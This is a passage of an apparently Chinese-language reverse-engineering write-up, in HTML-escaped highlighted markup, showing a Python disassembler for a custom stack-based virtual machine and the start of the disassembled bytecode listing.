        cur_arg &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; code[eip &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; (eip), sub_400E1D&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(cur_arg))
        edx &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
        memory[edx] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; cur_arg
        eip &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
        cur_arg &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;eax&amp;#34;&lt;/span&gt;
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; (eip), sub_400E1D&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(cur_arg))
        edx &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
        memory[edx] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; eax
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;:
        cur_arg &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ebx&amp;#34;&lt;/span&gt;
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; (eip), sub_400E1D&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(cur_arg))
        edx &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
        memory[edx] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ebx
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;:
        cur_arg &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ecx&amp;#34;&lt;/span&gt;
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; (eip), sub_400E1D&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(cur_arg))
        edx &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
        memory[edx] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ecx
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;:
        cur_arg &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;eax&amp;#34;&lt;/span&gt;
        edx &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; eip, sub_400E78&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(cur_arg))
        eax &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; memory[edx]
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;:
        cur_arg &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ebx&amp;#34;&lt;/span&gt;
        edx &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; eip, sub_400E78&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(cur_arg))
        ebx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; memory[edx]
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;:
        cur_arg &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ecx&amp;#34;&lt;/span&gt;
        edx &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; eip, sub_400E78&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(cur_arg))
        ecx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; memory[edx]
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;:
        eax &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; ebx
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; eip, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;eax += ebx;&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;:
        cur_arg &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; code[eip &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; eip, sub_400F16&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;eax&amp;#34;&lt;/span&gt;, cur_arg))
        eax &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; cur_arg
        eip &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;:
        cur_arg &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; code[eip &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; eip, sub_400F16&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ebx&amp;#34;&lt;/span&gt;, cur_arg))
        ebx &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; cur_arg
        eip &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;:
        cur_arg &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; code[eip &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; eip, sub_400F16&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ecx&amp;#34;&lt;/span&gt;, cur_arg))
        ecx &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; cur_arg
        eip &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;:
        eax &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; ebx
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; eip, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;eax -= ebx;&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;:
        cur_arg &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; code[eip &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; eip, sub_400FA8&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;eax&amp;#34;&lt;/span&gt;, cur_arg))
        eax &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; cur_arg
        eip &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;:
        cur_arg &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; code[eip &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; eip, sub_400FA8&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ebx&amp;#34;&lt;/span&gt;, cur_arg))
        ebx &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; cur_arg
        eip &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;:
        cur_arg &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; code[eip &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; eip, sub_400FA8&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ecx&amp;#34;&lt;/span&gt;, cur_arg))
        eip &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;:
        eax &lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt; ebx
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; eip, &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;eax ^= ebx;&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;:
        zf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (eax &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ebx)
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; eip, &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;zf = (eax == ebx);&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;:
        cur_arg &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; code[eip &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; eip, &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;push(eip+2); eip = &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hex(cur_arg)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;;&amp;#34;&lt;/span&gt;)
        memory[edx] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; eip
        edx &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
        eip &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;:
        edx &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; eip, &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pop(eip);&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;:
        cur_arg &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; code[eip &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; eip, &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;eip = &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hex(cur_arg)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;;&amp;#34;&lt;/span&gt;)
        eip &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;:
        cur_arg &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; code[eip &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; eip, &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;if zf:    eip = &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hex(cur_arg)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;;&amp;#34;&lt;/span&gt;)
        eip &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;:
        memory[edx] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; memory2[ecx]
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; eip, &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;push(memory2[ecx]);&amp;#34;&lt;/span&gt;)
        edx &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;:
        edx &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
        memory2[ecx] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; memory[edx]
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; eip, &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pop(memory2[ecx]);&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;:
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%02X&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; eip, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;break;&amp;#34;&lt;/span&gt;)
    eip &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;拿到反汇编结果&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;_00: push(eip&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;); eip &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x34&lt;/span&gt;;
_02: push(&lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt;);
_04: pop(ebx);
_05: zf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (eax &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ebx);
_06: &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; zf:    eip &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9&lt;/span&gt;;
_08: &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
_09: push(&lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;);
_0B: pop(ebx);
_0C: push(ecx);
_0D: push(eip&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;); eip &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1d&lt;/span&gt;;
_0F: pop(ecx);
_10: push(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
_12: pop(ebx);
_13: push(ecx);
_14: push(eip&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;); eip &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x40&lt;/span&gt;;
_16: pop(ecx);
_17: push(&lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;);
_19: pop(ebx);
_1A: push(eip&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;); eip &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1d&lt;/span&gt;;
